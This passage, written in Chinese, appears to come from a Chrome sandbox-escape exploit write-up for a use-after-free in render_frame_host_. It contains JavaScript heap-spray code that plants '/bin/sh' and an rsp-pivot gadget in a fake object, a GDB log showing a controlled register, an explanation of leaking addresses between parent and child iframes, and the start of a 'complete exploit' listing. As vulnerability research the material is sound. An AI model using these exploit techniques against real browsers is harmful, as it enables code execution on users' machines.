    uaf_ta[(0x10+0x160)/8] = BigInt(xchg);
    var uaf_uint8 = new Uint8Array(uaf_ab); // /bin/sh\x00
    uaf_uint8[0x10+0x160+8+0] = 0x2f;
    uaf_uint8[0x10+0x160+8+1] = 0x62;
    uaf_uint8[0x10+0x160+8+2] = 0x69;
    uaf_uint8[0x10+0x160+8+3] = 0x6e;
    uaf_uint8[0x10+0x160+8+4] = 0x2f;
    uaf_uint8[0x10+0x160+8+5] = 0x73;
    uaf_uint8[0x10+0x160+8+6] = 0x68;
    uaf_uint8[0x10+0x160+8+7] = 0x00;
    console.log("heap spray");
    for(let i = 0; i `，ArrayBuffer里伪造的数据就是vector的内容。
这里我们使用一个Array一样可以占位，演示如下:
    修改代码为await ptr.storeData('1', new Array(kRenderFrameHost).fill(0x32));
    ...
    ...
    [0922/095837.359069:INFO:CONSOLE(159)] "heap spray", source: http://localhost:8000/trigger.html (159)
    Thread 1 "chrome" received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    RAX: 0x3232323232323232 ('22222222')
可以看出从我们伪造的`render_frame_host_`里取出到rax的vtable
entry是`0x3232323232323232`，和我们保存在array里的数据是完全一致的。  
所以这里使用ArrayBuffer和TypedArray仅仅只是为了书写便利，没有额外的原因。
  * 父子iframe之间的通信
最后需要提到的一点是，由于我们需要劫持rsp到被释放的`render_frame_host_`上，而这个`render_frame_host_`在我们的这个exploit里是child
iframe的`render_frame_host_`
所以就要在child iframe里调用oob函数来leak出`render_frame_host_`，而不是在parent里，这样就涉及到如何将child
iframe里leak出来的地址传给parent。
这里我采用的方法是将leak出来的地址作为一个新的dom节点插入进去，然后在free掉child
iframe之前，在parent里，通过`window.frames[0].window.document.getElementById`的方式拿到child
iframe的window，也就是拿到里面的所有dom节点，从而拿到在child iframe里leak出来的地址。
### 完整exploit
          function gc() { for (let i = 0; i 